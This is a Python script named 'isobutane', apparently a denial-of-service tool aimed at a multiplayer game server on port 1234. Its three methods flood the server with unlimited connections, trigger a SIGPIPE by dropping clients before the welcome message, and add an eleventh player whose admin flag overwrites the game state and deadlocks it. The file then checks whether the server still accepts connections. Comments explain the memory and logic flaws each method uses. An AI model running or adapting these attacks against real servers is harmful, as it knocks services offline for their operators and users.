import socket
from time import sleep
import sys

arguments = sys.argv[1:]
method = ""
quiet = False

if len(arguments) == 0:
    print("isobutane: usage: isobutane server [--method ...] [-q]")
    exit()

server = arguments[0]

if "--method" in arguments:
    method = arguments[arguments.index("--method")+1]

if "-q" or "--quiet" in arguments:
    quiet = True

print("isobutane starting")
if not method:
    method = input("choose method: (alpha/beta/gamma) ")

def isobutane_alpha():
    # The player count is not limited in code so we can exploit that,
    # but stack overflow is not possible because some variable references the
    # inaccessible portion of memory first, causing a segmentation fault.

    counter = 0
    sockets = []
    while True:
        s = socket.socket()
        try:
            s.connect((server, 1234))
            if not quiet:
                s.send(("isobutane"+str(counter)+'\n').encode())
            sockets.append(s)
        except:
            print("isobutane-alpha appears to work correctly :D")
            break
        counter += 1

def isobutane_beta():
    # If a client quits before it receives a welcoming message,
    # a SIGPIPE occurs, and the server dies.

    sockets = []
    for i in range(5):
        s = socket.socket()
        sockets.append(s)
        s.connect((server, 1234))
        s.send(("isobutane"+str(i)+'\n').encode())
        s.shutdown(socket.SHUT_RD)

def isobutane_gamma():
    # If 11th player joins the game, it just so happens that the player[11].is_admin
    # value overwrites game's state.stage to STAGE_PLAYING. This makes the game think the
    # game is already going on, and it deadlocks.

    # NOTE: This is basically alpha, but made not to crash the server, but to deadlock it.

    counter = 0
    sockets = []
    for i in range(11):
        s = socket.socket()
        try:
            s.connect((server, 1234))
            if not quiet:
                s.send(("isobutane"+str(counter)+'\n').encode())
            sockets.append(s)
        except:
            print("isobutane-alpha appears to work correctly :D")
            break
    sleep(1)


if method == "alpha":
    isobutane_alpha()
elif method == "beta":
    isobutane_beta()
elif method == "gamma":
    isobutane_gamma()

sleep(0.5)

try:
    s = socket.socket()
    s.connect((server, 1234))
    print("isobutane did not work")
except:
    print("isobutane worked :D")
